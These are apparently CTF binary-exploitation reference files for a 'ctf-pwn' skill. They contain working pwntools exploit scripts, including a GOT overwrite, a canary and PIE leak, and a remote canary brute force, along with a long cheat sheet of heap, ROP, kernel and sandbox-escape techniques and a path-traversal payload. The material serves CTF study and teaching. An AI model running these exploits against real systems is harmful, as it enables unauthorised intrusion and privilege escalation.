**Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.

**Struct layout example:**
```c
struct Student {
    char name[36];      // offset 0x00 - data buffer
    int *grade_ptr;     // offset 0x24 - pointer to separate allocation
    float gpa;          // offset 0x28
};  // total: 0x2c (44 bytes)
```

**Exploitation:**
```python
from pwn import *

WIN = 0x08049316
GOT_TARGET = 0x0804c00c  # printf@GOT

# 1. Create object (allocates struct + sub-allocations)
create_student("AAAA", 5, 3.5)

# 2. Modify name - overflow into pointer field with GOT address
payload = b'A' * 36 + p32(GOT_TARGET)  # 36 bytes padding + GOT addr
modify_name(0, payload)

# 3. Modify grade - scanf("%d", corrupted_ptr) writes to GOT
modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry

# 4. Trigger overwritten function -> jumps to win
```

**GOT target selection strategy:**
- Identify which libc functions the `win` function calls internally
- Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
- Prefer functions called in the main loop AFTER the write

| Win uses | Safe GOT targets |
|----------|-------------------|
| puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
| printf, system | puts, exit, free |
| system only | puts, printf, exit |

## Signed Integer Bypass (Negative Quantity)

`scanf("%d")` without sign check; negative input bypasses unsigned comparisons. See [advanced-exploits.md](advanced-exploits.md#signed-integer-bypass-negative-quantity) for full details.

## Canary-Aware Partial Overflow

Overflow `valid` flag between buffer and canary without touching the canary. Use `./` as no-op path padding for precise length control. See [advanced-exploits.md](advanced-exploits.md#canary-aware-partial-overflow) for full exploit chain.

## OOB Read via Stride/Rate Leak (DiceCTF 2026)

**Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).

**Stack layout:**
```text
input_buf  [0-31]    <- user input (null at byte 31)
crushed    [32-63]   <- output buffer
canary     [72-79]   <- stack canary
saved rbp  [80-87]
return addr [88-95]  <- code pointer (defeats PIE)
```

**Vulnerable pattern:**
```c
void crush_string(char *input, char *output, int rate, int output_max_len) {
    for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
        output[out_idx++] = input[i];  // rate > bufsize skips past null terminator
    }
}
```

**Exploitation:**
```python
from pwn import *

# Leak canary bytes 1-7 (byte 0 always 0x00)
canary = b'\x00'
for offset in range(73, 80):  # canary at offsets 72-79
    p.sendline(b'A' * 31)     # fill buffer (null at byte 31)
    p.sendline(str(offset).encode())  # rate = offset → reads input[0] then input[offset]
    p.sendline(b'2')           # output length = 2
    resp = p.recvline()
    canary += resp[1:2]        # second char is leaked byte

# Leak return address bytes 0-5 (top 2 always 0x00 in userspace)
ret_addr = b''
for offset in range(88, 94):
    p.sendline(b'A' * 31)
    p.sendline(str(offset).encode())
    p.sendline(b'2')
    resp = p.recvline()
    ret_addr += resp[1:2]

pie_base = u64(ret_addr.ljust(8, b'\x00')) - known_offset
admin_portal = pie_base + admin_offset

# Overflow gets() with leaked canary + computed address
payload = b'A' * 24 + canary + p64(0) + p64(admin_portal)
p.sendline(payload)
```

**When to use:** Any function that traverses a buffer with user-controlled step size and null-terminator-based stop condition.

**Key insight:** Stride-based OOB reads leak one byte per iteration by controlling which offset lands on the target byte. With enough iterations, leak full canary + return address to defeat both stack canary and PIE.

## Stack Canary Byte-by-Byte Brute Force on Forking Servers

**Pattern:** Server calls `fork()` for each connection. The child process inherits the same canary value. Brute-force the canary one byte at a time — each wrong byte crashes the child, but the parent continues with the same canary.

**Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.

**Exploitation:**
```python
from pwn import *

OFFSET = 64  # bytes to canary (buffer size)
HOST, PORT = "target", 1337

def try_byte(known_canary, guess_byte):
    """Send overflow with known canary bytes + one guess. No crash = correct byte."""
    p = remote(HOST, PORT)
    payload = b'A' * OFFSET + known_canary + bytes([guess_byte])
    p.send(payload)
    try:
        resp = p.recv(timeout=1)
        p.close()
        return True   # No crash → byte is correct
    except:
        p.close()
        return False  # Crash → wrong byte

# Byte 0 is always \x00
canary = b'\x00'

# Brute-force bytes 1-7 (only 256 attempts per byte, 7*256 = 1792 total)
for byte_pos in range(1, 8):
    for guess in range(256):
        if try_byte(canary, guess):
            canary += bytes([guess])
            print(f"Canary byte {byte_pos}: 0x{guess:02x}")
            break
    else:
        print(f"Failed at byte {byte_pos}")
        break

print(f"Full canary: {canary.hex()}")

# Now overflow with correct canary + ROP chain
p = remote(HOST, PORT)
payload = b'A' * OFFSET + canary + b'B' * 8 + p64(win_addr)
p.sendline(payload)
```

**Prerequisites:**
- Server must `fork()` per connection (canary stays constant across children)
- Overflow must be controllable byte-by-byte (no all-at-once read)
- Distinguishable crash vs success response (timeout, error message, or connection behavior)

**Expected attempts:** 7 * 128 = 896 average (7 bytes * 128 average guesses per byte). Maximum 7 * 256 = 1792.

**Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).

---

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.



---

<!-- Source: quickref.md -->

# ctf-pwn — Quick Reference

Inline code snippets and quick-reference tables. Loaded on demand from `SKILL.md`. All detailed techniques live in the category-specific support files listed in `SKILL.md#additional-resources`.


## Source Code Red Flags

- Threading/`pthread` -> race conditions
- `usleep()`/`sleep()` -> timing windows
- Global variables in multiple threads -> TOCTOU

## Race Condition Exploitation

```bash
bash -c '{ echo "cmd1"; echo "cmd2"; sleep 1; } | nc host port'
```

## Common Vulnerabilities

- Buffer overflow: `gets()`, `scanf("%s")`, `strcpy()`
- Format string: `printf(user_input)`
- Integer overflow, UAF, race conditions

## Protection Implications for Exploit Strategy

| Protection | Status | Implication |
|-----------|--------|-------------|
| PIE | Disabled | All addresses (GOT, PLT, functions) are fixed - direct overwrites work |
| RELRO | Partial | GOT is writable - GOT overwrite attacks possible |
| RELRO | Full | GOT is read-only - need alternative targets (hooks, vtables, return addr) |
| NX | Enabled | Can't execute shellcode on stack/heap - use ROP or ret2win |
| Canary | Present | Stack smash detected - need leak or avoid stack overflow (use heap) |

**Quick decision tree:**
- Partial RELRO + No PIE -> GOT overwrite (easiest, use fixed addresses)
- Full RELRO -> target `__free_hook`, `__malloc_hook` (glibc < 2.34), or return addresses
- Stack canary present -> prefer heap-based attacks or leak canary first

## Stack Buffer Overflow

1. Find offset: `cyclic 200` then `cyclic -l <value>`
2. Check protections: `checksec --file=binary`
3. No PIE + No canary = direct ROP
4. Canary leak via format string or partial overwrite
5. Canary brute-force byte-by-byte on forking servers (7*256 attempts max)

**ret2win with magic value:** Overflow -> `ret` (alignment) -> `pop rdi; ret` -> magic -> win(). See [overflow-basics.md](overflow-basics.md) for full exploit code.

**Stack alignment:** Modern glibc needs 16-byte alignment; SIGSEGV in `movaps` = add extra `ret` gadget. See [overflow-basics.md](overflow-basics.md).

**Offset calculation:** Buffer at `rbp - N`, return at `rbp + 8`, total = N + 8. See [overflow-basics.md](overflow-basics.md).

**Input filtering:** `memmem()` checks block certain byte sequences; assert payload doesn't contain banned strings. See [overflow-basics.md](overflow-basics.md).

**Finding gadgets:** `ROPgadget --binary binary | grep "pop rdi"`, or use pwntools `ROP()` which also finds hidden gadgets in CMP immediates. See [overflow-basics.md](overflow-basics.md).

## Struct Pointer Overwrite (Heap Menu Challenges)

**Pattern:** Menu create/modify/delete on structs with data buffer + pointer. Overflow name into pointer field with GOT address, then write win address via modify. See [overflow-basics.md](overflow-basics.md) for full exploit and GOT target selection table.

## Signed Integer Bypass

**Pattern:** `scanf("%d")` without sign check; negative quantity * price = negative total, bypasses balance check. See [overflow-basics.md](overflow-basics.md).

## Canary-Aware Partial Overflow

**Pattern:** Overflow `valid` flag between buffer and canary. Use `./` as no-op path padding for precise length. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit chain.

## Global Buffer Overflow (CSV Injection)

**Pattern:** Adjacent global variables; overflow via extra CSV delimiters changes filename pointer. See [overflow-basics.md](overflow-basics.md) and [advanced.md](advanced.md) for full exploit.

## ROP Chain Building

Leak libc via `puts@PLT(puts@GOT)`, return to vuln, stage 2 with `system("/bin/sh")`. See [rop-and-shellcode.md](rop-and-shellcode.md) for full two-stage ret2libc pattern, leak parsing, and return target selection.

**Raw syscall ROP:** When `system()`/`execve()` crash (CET/IBT), use `pop rax; ret` + `syscall; ret` from libc. See [rop-and-shellcode.md](rop-and-shellcode.md).

**ret2csu:** `__libc_csu_init` gadgets control `rdx`, `rsi`, `edi` and call any GOT function — universal 3-argument call without libc gadgets. See [rop-and-shellcode.md](rop-and-shellcode.md#ret2csu--__libc_csu_init-gadgets-crypto-cat).

**Bad char XOR bypass:** XOR payload data with key before writing to `.data`, then XOR back in place with ROP gadgets. Avoids null bytes, newlines, and other filtered characters. See [rop-and-shellcode.md](rop-and-shellcode.md#bad-character-bypass-via-xor-encoding-in-rop-crypto-cat).

**Exotic gadgets (BEXTR/XLAT/STOSB/PEXT):** When standard `mov` write gadgets are unavailable, chain obscure x86 instructions for byte-by-byte memory writes. See [rop-and-shellcode.md](rop-and-shellcode.md#exotic-x86-gadgets--bextrxlatstosbpext-crypto-cat).

**Stack pivot (xchg rax,esp):** Swap stack pointer to attacker-controlled heap/buffer when overflow is too small for full ROP chain. Requires `pop rax; ret` to load pivot address first. See [rop-and-shellcode.md](rop-and-shellcode.md#stack-pivot-via-xchg-raxesp-crypto-cat).

**rdx control:** After `puts()`, rdx is clobbered to 1. Use `pop rdx; pop rbx; ret` from libc, or re-enter binary's read setup + stack pivot. See [rop-and-shellcode.md](rop-and-shellcode.md).

**Shell interaction:** After `execve`, `sleep(1)` then `sendline(b'cat /flag*')`. See [rop-and-shellcode.md](rop-and-shellcode.md).

## ret2vdso — No-Gadget Binary Exploitation

**Pattern:** Statically-linked binary with minimal functions and no useful ROP gadgets. The Linux kernel maps a vDSO into every process, containing usable gadgets. Leak vDSO base from `AT_SYSINFO_EHDR` (auxv type `0x21`) on the stack, dump the vDSO, extract gadgets for `execve`. vDSO is kernel-specific — always dump the remote copy. See [rop-advanced.md](rop-advanced.md#ret2vdso--using-kernel-vdso-gadgets-htb-nowhere-to-go).

## Use-After-Free (UAF) Exploitation

**Pattern:** Menu create/delete/view where `free()` doesn't NULL pointer. Create -> leak -> free -> allocate same-size object to overwrite function pointer -> trigger callback. Key: both structs must be same size for tcache reuse. See [advanced.md](advanced.md) for full exploit code.

## Seccomp Bypass

Alternative syscalls when seccomp blocks `open()`/`read()`: `openat()` (257), `openat2()` (437, often missed!), `sendfile()` (40), `readv()`/`writev()`, `mmap()` (9, map flag file into memory instead of read), `pread64()` (17).

**Check rules:** `seccomp-tools dump ./binary`

See [rop-advanced.md](rop-advanced.md) for quick reference and [advanced.md](advanced.md) for conditional buffer address restrictions, shellcode without relocations, `scmp_arg_cmp` struct layout.

## Stack Shellcode with Input Reversal

**Pattern:** Binary reverses input buffer. Pre-reverse shellcode, use partial 6-byte RIP overwrite, trampoline `jmp short` to NOP sled. See [rop-advanced.md](rop-advanced.md).

## .fini_array Hijack

Writable `.fini_array` + arbitrary write -> overwrite with win/shellcode address. Works even with Full RELRO. See [rop-advanced.md](rop-advanced.md) for implementation.

## Path Traversal Sanitizer Bypass

**Pattern:** Sanitizer skips char after banned char match; double chars to bypass (e.g., `....//....//etc//passwd`). Also try `/proc/self/fd/3` if binary has flag fd open. See [advanced.md](advanced.md).

## Kernel Exploitation

**modprobe_path overwrite (smallkirby/kernelpwn):** Overwrite `modprobe_path` with evil script path, then `execve` a binary with non-printable first 4 bytes. Kernel runs the script as root. Requires AAW; blocked by `CONFIG_STATIC_USERMODEHELPER`. See [kernel.md](kernel.md).

**tty_struct kROP (smallkirby/kernelpwn):** `open("/dev/ptmx")` allocates `tty_struct` in kmalloc-1024. Overwrite `ops` with fake vtable → `ioctl()` hijacks RIP. Build two-phase kROP within `tty_struct` itself via `leave` gadget stack pivot. See [kernel.md](kernel.md).

**userfaultfd race stabilization (smallkirby/kernelpwn):** Register mmap'd region with uffd. Kernel page fault blocks the thread → deterministic race window for heap manipulation. See [kernel.md](kernel.md).

**Heap spray structures:** `tty_struct` (kmalloc-1024, kbase leak), `tty_file_private` (kmalloc-32, kheap leak), `poll_list` (variable, arbitrary free via linked list), `user_key_payload` (variable, `add_key()` controlled data), `seq_operations` (kmalloc-32, kbase leak). See [kernel.md](kernel.md).

**ret2usr (hxp CTF 2020):** When SMEP/SMAP are disabled, call `prepare_kernel_cred(0)` → `commit_creds()` directly from userland function, then `swapgs; iretq` to return as root. See [kernel.md](kernel.md).

**Kernel ROP chain (hxp CTF 2020):** With SMEP, build ROP: `pop rdi; ret` → 0 → `prepare_kernel_cred` → `mov rdi, rax` → `commit_creds` → `swapgs` → `iretq` → userland. See [kernel.md](kernel.md).

**KPTI bypass methods (hxp CTF 2020):** Four approaches: `swapgs_restore_regs_and_return_to_usermode + 22` trampoline, SIGSEGV signal handler, modprobe_path overwrite via ROP, core_pattern pipe via ROP. See [kernel.md](kernel.md).

**FGKASLR bypass (hxp CTF 2020):** Early `.text` section gadgets are unaffected. Resolve randomized functions via `__ksymtab` relative offsets in multi-stage exploit. See [kernel.md](kernel.md).

**Config recon:** Check QEMU script for SMEP/SMAP/KASLR/KPTI. Detect FGKASLR via `readelf -S vmlinux` section count (30 vs 36000+). Check `CONFIG_KALLSYMS_ALL` via `grep modprobe_path /proc/kallsyms`. See [kernel.md](kernel.md).

OOB via vulnerable `lseek`, heap grooming with `fork()`, SUID exploits. Check `CONFIG_SLAB_FREELIST_RANDOM` and `CONFIG_SLAB_MERGE_DEFAULT`. See [advanced.md](advanced.md).

**Race window extension (DiceCTF 2026):** `MADV_DONTNEED` + `mprotect()` loop forces repeated page faults during kernel operations touching userland memory, extending race windows from sub-ms to tens of seconds. See [kernel-techniques.md](kernel-techniques.md#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026).

**Cross-cache via CPU split (DiceCTF 2026):** Allocate on CPU 0, free from CPU 1 — objects escape dedicated SLUB caches via partial list overflow → buddy allocator. See [kernel-techniques.md](kernel-techniques.md#cross-cache-attack-via-cpu-split-strategy-dicectf-2026).

**PTE overlap file write (DiceCTF 2026):** Reclaim freed page as PTE page, overlap anonymous + file-backed mappings → write through anonymous side modifies file content at physical page level. See [kernel-techniques.md](kernel-techniques.md#pte-overlap-primitive-for-file-write-dicectf-2026).

## Leakless Heap Exploitation (glibc 2.32+)

**Safe-Linking** (glibc 2.32+) : `fd_mangled = fd XOR (chunk_addr >> 12)`. Protège fd dans les chunks freés mais PAS `tcache_perthread_struct.entries[]`.

**House of Water** : Corrompt `tcache_perthread_struct.entries[i]` directement (pas de safe-linking ici) → allocation arbitraire sans aucun leak. Voir [heap-leakless.md](heap-leakless.md).

**House of Tangerine** (glibc 2.39+) : AAW sans jamais appeler `free()`. Overflow vers `tcache_perthread_struct`, modifier `counts[]` + `entries[]` → `malloc()` retourne l'adresse cible. Voir [heap-leakless.md](heap-leakless.md).

**House of Rust** : Bypass safe-linking via partial overwrite du fd (12 bits bas fixes, 1 nibble à bruteforcer). Voir [heap-leakless.md](heap-leakless.md).

**House of Corrosion** : Corrompre `global_max_fast` via unsorted bin attack → tous les free() vont en fastbin → placement dans libc. 4 bits d'entropie à bruteforcer (16 tentatives). Voir [heap-leakless.md](heap-leakless.md).

**Chaîne Water + Apple 2** : Heap leak (tcache fd XOR key) → libc leak (unsorted bin fd/bk) → tcache_perthread corruption → FSOP fake FILE → RCE sans aucun leak préalable. Voir [heap-leakless.md](heap-leakless.md).

## Blind ROP (BROP) — Exploit sans binaire

**Prérequis :** serveur forking, crash observable (connexion fermée), overflow présent.

1. **Canary leak byte-by-byte** : 7×256 = 1792 tentatives max (3 minutes typiquement)
2. **Stop gadget** : adresse qui ne crashe pas (ex: `_start`, `main`)
3. **BROP gadget** : `pop rbx;rbp;r12;r13;r14;r15;ret` — survit avec 6 junk, crashe avec 5
4. **PLT scan** : appeler chaque entrée avec argument connu → chercher output lisible
5. **Binary dump** : `puts(addr)` sur chaque page → reconstruire le binaire
6. **Exploit classique** sur le binaire dumpé

Voir [brop.md](brop.md) pour implémentation complète.

## FSOP glibc 2.35+ (FSOPAgain / House of Apple 2)

glibc 2.35 vérifie que la vtable ∈ `[__start___libc_IO_vtables, __stop___libc_IO_vtables]`.

**Bypass :** `_IO_wfile_jumps` est une vtable légitime qui appelle des callbacks depuis `_wide_data`. Construire un fake FILE avec `_flags = " sh\x00"`, `_wide_data->_wide_vtable->doallocate = system` → `system(" sh")`. Voir [format-string.md](format-string.md#fsop-via-format-string--glibc-235-fsopage).

## Kernel Avancé (2024-2025)

**EntryBleed (CVE-2022-4543)** : Prefetch timing side-channel → leak adresse `entry_SYSCALL_64` → KASLR bypass sans privilèges sur Intel. Voir [kernel-advanced.md](kernel-advanced.md).

**SLUBStick / CROSS-X** : Cross-cache attack → heap overflow dans slab A → vider le slab → réclamer les pages dans slab B (tty_struct) → exploit classique. Sur Ubuntu 24.04 avec RANDOM_KMALLOC_CACHES : utiliser elastic objects (msg_msg). Voir [kernel-advanced.md](kernel-advanced.md).

**DirtyCred** : Swap `struct cred` en kernel heap pour élévation de privilèges sans RIP hijack. Remplacé par io_uring-based techniques sur Linux 5.11+ (userfaultfd restreint). Voir [kernel-advanced.md](kernel-advanced.md).

**Windows PreviousMode Write** (CVE-2024-21338) : Modifier `KTHREAD->PreviousMode = KernelMode (0)` → `NtWriteVirtualMemory` devient AAW universel → token stealing parfait. Voir [kernel-advanced.md](kernel-advanced.md).

## io_uring UAF with SQE Injection

**Pattern:** Custom slab allocator + io_uring worker thread. FLUSH frees objects (UAF), type confusion via slab fallback, craft `IORING_OP_OPENAT` SQE in reused memory. io_uring trusts SQE contents from userland shared memory. See [advanced-exploits-2.md](advanced-exploits-2.md#io_uring-uaf-with-sqe-injection-apoorvctf-2026).

## Integer Truncation Bypass (int32→int16)

**Pattern:** Input validated as int32 (>= 0), cast to int16_t for bounds check. Value 65534 passes int32 check, becomes -2 as int16_t → OOB array access. Use `xchg rdi, rax; cld; ret` gadget for dynamic fd capture in containerized ORW chains. See [advanced-exploits-2.md](advanced-exploits-2.md#integer-truncation-bypass-int32int16-apoorvctf-2026).

## Format String Quick Reference

- Leak stack: `%p.%p.%p.%p.%p.%p` | Leak specific: `%7$p`
- Write: `%n` (4-byte), `%hn` (2-byte), `%hhn` (1-byte), `%lln` (8-byte full 64-bit)
- GOT overwrite for code execution (Partial RELRO required)

See [format-string.md](format-string.md) for GOT overwrite patterns, blind pwn, filter bypass, canary+PIE leak, `__free_hook` overwrite, and argument retargeting.

## .rela.plt / .dynsym Patching (Format String)

**When to use:** GOT addresses contain bad bytes (e.g., 0x0a). Patch `.rela.plt` symbol index + `.dynsym` st_value to redirect function resolution to `win()`. Bypasses all GOT byte restrictions. See [format-string.md](format-string.md) for full technique and code.

## Heap Exploitation

- tcache poisoning (glibc 2.26+), fastbin dup / double free
- House of Force (old glibc), unsorted bin attack
- **House of Apple 2** (glibc 2.34+): FSOP (File Stream Oriented Programming) via `_IO_wfile_jumps` when `__free_hook`/`__malloc_hook` removed. Fake FILE with `_flags = " sh"`, vtable chain → `system(fp)`.
- **Classic unlink**: Corrupt adjacent chunk metadata, trigger backward consolidation for write-what-where primitive. Pre-2.26 glibc only. See [advanced.md](advanced.md#classic-heap-unlink-attack-crypto-cat).
- **House of Einherjar**: Off-by-one null clears PREV_INUSE, backward consolidation with self-pointing unlink.
- **Safe-linking** (glibc 2.32+): tcache fd mangled as `ptr ^ (chunk_addr >> 12)`.
- Check glibc version: `strings libc.so.6 | grep GLIBC`
- Freed chunks contain libc pointers (fd/bk) -> leak via error messages or missing null-termination
- Heap feng shui: control alloc order/sizes, create holes, place targets adjacent to overflow source

**House of Orange:** Corrupt top chunk size → large malloc forces sysmalloc → old top freed without calling `free()`. Chain with FSOP. See [advanced.md](advanced.md#house-of-orange).

**House of Spirit:** Forge fake chunk in target area, `free()` it, reallocate to get write access. Requires valid size + next chunk size. See [advanced.md](advanced.md#house-of-spirit).

**House of Lore:** Corrupt smallbin `bk` → link fake chunk → second malloc returns attacker-controlled address. See [advanced.md](advanced.md#house-of-lore).

**ret2dlresolve:** Forge Elf64_Sym/Rela to resolve arbitrary libc function without leak. `Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])`. Requires Partial RELRO. See [advanced.md](advanced.md#ret2dlresolve).

**tcache stashing unlink (glibc 2.29+):** Corrupt smallbin chunk's `bk` during tcache stashing → arbitrary address linked into tcache → write primitive. See [advanced.md](advanced.md#tcache-stashing-unlink-attack).

See [advanced.md](advanced.md) for House of Apple 2 FSOP chain, House of Orange/Spirit/Lore, ret2dlresolve, tcache stashing unlink, custom allocator exploitation (nginx pools), heap overlap via base conversion, tree data structure stack underallocation, FSOP + seccomp bypass via openat/mmap/write with `mov rsp, rdx` stack pivot.

## JIT Compilation Exploits

**Pattern:** Off-by-one in instruction encoding -> misaligned machine code. Embed shellcode as operand bytes of subtraction operations, chain with 2-byte `jmp` instructions. See [advanced.md](advanced.md).

**BF JIT unbalanced bracket:** Unbalanced `]` pops tape address (RWX) from stack → write shellcode to tape with `+`/`-`, trigger `]` to jump to it. See [advanced.md](advanced.md).

## Type Confusion in Interpreters

**Pattern:** Interpreter sets wrong type tag → struct fields reinterpreted. Unused padding bytes in one variant become active pointers/data in another. Flag bytes as type value trigger UNKNOWN_DATA dump. See [advanced.md](advanced.md).

## Off-by-One Index / Size Corruption

**Pattern:** Array index 0 maps to `entries[-1]`, overlapping struct metadata (size field). Corrupted size → OOB read leaks canary/libc, then OOB write places ROP chain. See [advanced.md](advanced.md).

## Double win() Call

**Pattern:** `win()` checks `if (attempts++ > 0)` — needs two calls. Stack two return addresses: `p64(win) + p64(win)`. See [advanced.md](advanced.md).

## Esoteric Language GOT Overwrite

**Pattern:** Brainfuck/Pikalang interpreter with unbounded tape = arbitrary read/write relative to buffer base. Move pointer to GOT, overwrite byte-by-byte with `system()`. See [advanced.md](advanced.md).

## DNS Record Buffer Overflow

**Pattern:** Many AAAA records overflow stack buffer in DNS response parser. Set up DNS server with excessive records, overwrite return address. See [advanced.md](advanced.md).

## ASAN Shadow Memory Exploitation

**Pattern:** Binary with AddressSanitizer has format string + OOB write. ASAN may use "fake stack" (50% chance). Leak PIE, detect real vs fake stack, calculate OOB write offset to overwrite return address. See [advanced.md](advanced.md).

## Format String with RWX .fini_array Hijack

**Pattern (Encodinator):** Base85-encoded input in RWX memory passed to `printf()`. Write shellcode to RWX region, overwrite `.fini_array[0]` via format string `%hn` writes. Use convergence loop for base85 argument numbering. See [advanced.md](advanced.md).

## Custom Canary Preservation

**Pattern:** Buffer overflow must preserve known canary value. Write exact canary bytes at correct offset: `b'A' * 64 + b'BIRD' + b'X'`. See [advanced.md](advanced.md).

## MD5 Preimage Gadget Construction

**Pattern (Hashchain):** Brute-force MD5 preimages with `eb 0c` prefix (jmp +12) to skip middle bytes; bytes 14-15 become 2-byte i386 instructions. Build syscall chains from gadgets like `31c0` (xor eax), `cd80` (int 0x80). See [advanced.md](advanced.md) for C code and v2 technique.

## Python Sandbox Escape

AST bypass via f-strings, audit hook bypass with `b'flag.txt'` (bytes vs str), MRO-based `__builtins__` recovery. See [sandbox-escape.md](sandbox-escape.md).

## VM GC-Triggered UAF (Slab Reuse)

**Pattern:** Custom VM with NEWBUF/SLICE/GC opcodes. Slicing creates shared slab reference; dropping+GC'ing slice frees slab while parent still holds it. Allocate function object to reuse slab, leak code pointer via UAF read, overwrite with win() address. See [advanced.md](advanced.md).

## GC Null-Reference Cascading Corruption

**Pattern:** Mark-compact GC follows null references to heap address 0, creating fake object. During compaction, memmove cascades corruption through adjacent object headers → OOB access → libc leak → FSOP. See [advanced.md](advanced.md).

## OOB Read via Stride/Rate Leak

**Pattern:** String processing function with user-controlled stride skips past null terminator, leaking stack canary and return address one byte at a time. Then overflow with leaked values. See [overflow-basics.md](overflow-basics.md).

## SROP with UTF-8 Constraints

**Pattern:** When payload must be valid UTF-8 (Rust binaries, JSON parsers), use SROP — only 3 gadgets needed. Multi-byte UTF-8 sequences spanning register field boundaries "fix" high bytes. See [rop-advanced.md](rop-advanced.md).

## VM Exploitation (Custom Bytecode)

**Pattern:** Custom VM with OOB read/write in syscalls. Leak PIE via XOR-encoded function pointer, overflow to rewrite pointer with `win() ^ KEY`. See [sandbox-escape.md](sandbox-escape.md).

## FUSE/CUSE Character Device Exploitation

Look for `cuse_lowlevel_main()` / `fuse_main()`, backdoor write handlers with command parsing. Exploit to `chmod /etc/passwd` then modify for root access. See [sandbox-escape.md](sandbox-escape.md).

## Busybox/Restricted Shell Escalation

Find writable paths via character devices, target `/etc/passwd` or `/etc/sudoers`, modify permissions then content. See [sandbox-escape.md](sandbox-escape.md).

## Shell Tricks

`exec<&3;sh>&3` for fd redirection, `$0` instead of `sh`, `ls -la /proc/self/fd` to find correct fd. See [sandbox-escape.md](sandbox-escape.md).

## Double Stack Pivot to BSS via leave;ret (Midnightflag 2026)

**Pattern:** Small overflow (only RBP + RIP). Overwrite RBP → BSS address, RIP → `leave; ret` gadget. `leave` sets RSP = RBP (BSS). Second stage at BSS calls `fgets(BSS+offset, large_size, stdin)` to load full ROP chain. See [rop-advanced.md](rop-advanced.md#double-stack-pivot-to-bss-via-leaveret-midnightflag-2026).

## RETF Architecture Switch for Seccomp Bypass (Midnightflag 2026)

**Pattern:** Seccomp blocks 64-bit syscalls (`open`, `execve`). Use `retf` gadget to load CS=0x23 (IA-32e compatibility mode). In 32-bit mode, `int 0x80` uses different syscall numbers (open=5, read=3, write=4) not covered by the filter. Requires `mprotect` to make BSS executable for 32-bit shellcode. See [rop-advanced.md](rop-advanced.md#retf-architecture-switch-for-seccomp-bypass-midnightflag-2026).

## Leakless Libc via Multi-fgets stdout FILE Overwrite (Midnightflag 2026)

**Pattern:** No libc leak available. Chain multiple `fgets(addr, 7, stdin)` calls via ROP to construct fake stdout FILE struct on BSS. Set `_IO_write_base` to GOT entry, call `fflush(stdout)` → leaks GOT content → libc base. The 7-byte writes avoid null byte corruption since libc pointer MSBs are already `\x00`. See [advanced-exploits-2.md](advanced-exploits-2.md#leakless-libc-via-multi-fgets-stdout-file-overwrite-midnightflag-2026).

## Signed/Unsigned Char Underflow → Heap Overflow (Midnightflag 2026)

**Pattern:** Size field stored as `signed char`, cast to `unsigned char` for use. `size = -112` → `(unsigned char)(-112) = 144`, overflowing a 127-byte buffer by 17 bytes. Combine with XOR keystream brute-force for byte-precise writes, forge chunk sizes for unsorted bin promotion (libc leak), FSOP stdout for TLS leak, and TLS destructor (`__call_tls_dtors`) overwrite for RCE. See [advanced-exploits-2.md](advanced-exploits-2.md#signedunsigned-char-underflow--heap-overflow--tls-destructor-hijack-midnightflag-2026).

## TLS Destructor Hijack via `__call_tls_dtors`

**Pattern:** Alternative to House of Apple 2 on glibc 2.34+. Forge `__tls_dtor_list` entries with pointer-guard-mangled function pointers: `encoded = rol(target ^ pointer_guard, 0x11)`. Requires leaking pointer guard from TLS segment (via FSOP stdout redirection). Each node calls `PTR_DEMANGLE(func)(obj)` on exit. See [advanced-exploits-2.md](advanced-exploits-2.md#tls-destructor-overwrite-for-rce-via-__call_tls_dtors).

## Signed Int Overflow → Negative OOB Heap Write (Midnight 2026)

**Pattern (Canvas of Fear):** Index formula `y * width + x` in signed 32-bit int overflows to negative value, passing bounds check and writing backward into heap metadata. Use to corrupt adjacent chunk sizes/pointers, leak libc via unsorted bin, redirect a data pointer to `environ` for stack leak, then write ROP chain to main's return address. When binary is behind a web API, chain XSS → Fetch API → heap exploit, and inject `\n` in API parameters for command stacking via `sendline()`.

See [advanced-exploits-2.md](advanced-exploits-2.md#signed-int-overflow--negative-oob-heap-write--xss-to-binary-pwn-bridge-midnight-2026) for full exploit chain, XSS bridge pattern, and RGB pixel write primitive.

## Custom Shadow Stack Bypass via Pointer Overflow (Midnight 2026)

**Pattern (Revenant):** Userland shadow stack in `.bss` with unbounded pointer. Recurse to advance `shadow_stack_ptr` past the array into user-controlled memory (e.g., `username` buffer), write `win()` there, then overflow the hardware stack return address to match. Both checks pass.

```python
# Iterate (target_addr - shadow_stack_base) // 8 times to overflow pointer
for i in range(512):
    io.sendlineafter(b"Survivor name:\n", fit(exe.symbols["win"]))
    io.sendlineafter(b"[0] Flee", b"4")  # recurse
```

See [advanced-exploits-2.md](advanced-exploits-2.md#custom-shadow-stack-bypass-via-pointer-overflow-midnight-2026) for full exploit and `.bss` layout analysis.

## Windows SEH Overwrite + VirtualAlloc ROP (RainbowTwo HTB)

Format string leak defeats ASLR. SEH (Structured Exception Handler) overwrite with stack pivot to ROP chain. `pushad` builds VirtualAlloc call frame for DEP (Data Execution Prevention) bypass. Detached process launcher for shell stability on thread-based servers. See [advanced-exploits-2.md](advanced-exploits-2.md#windows-seh-overwrite--pushad-virtualalloc-rop-rainbowtwo-htb).

## SeDebugPrivilege → SYSTEM

`SeDebugPrivilege` + Meterpreter `migrate -N winlogon.exe` → SYSTEM. See [advanced-exploits-2.md](advanced-exploits-2.md#sedebugprivilege--system-rainbowtwo-htb).

## Useful Commands

`checksec`, `one_gadget`, `ropper`, `ROPgadget`, `seccomp-tools dump`, `strings libc | grep GLIBC`. See [rop-advanced.md](rop-advanced.md) for full command list and pwntools template.




---

<!-- Source: rop-advanced.md -->

# CTF Pwn - Advanced ROP Techniques

## Table of Contents
